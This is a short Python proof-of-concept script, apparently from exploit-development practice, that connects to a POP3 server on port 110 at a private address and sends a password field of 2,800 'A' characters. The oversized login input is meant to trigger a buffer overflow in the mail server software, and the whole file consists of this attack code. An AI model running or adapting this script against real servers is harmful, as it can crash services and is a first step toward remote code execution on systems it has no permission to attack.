#!/usr/bin/env python
# by Anakein
import socket

print("dev connection poc.py")

buf = 'A'*2800

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('10.0.1.104',110))

s.send('USER anakein \r\n')
s.recv(1024)

s.send('PASS ' +buf+ '\r\n')
s.recv(1024)

s.close()
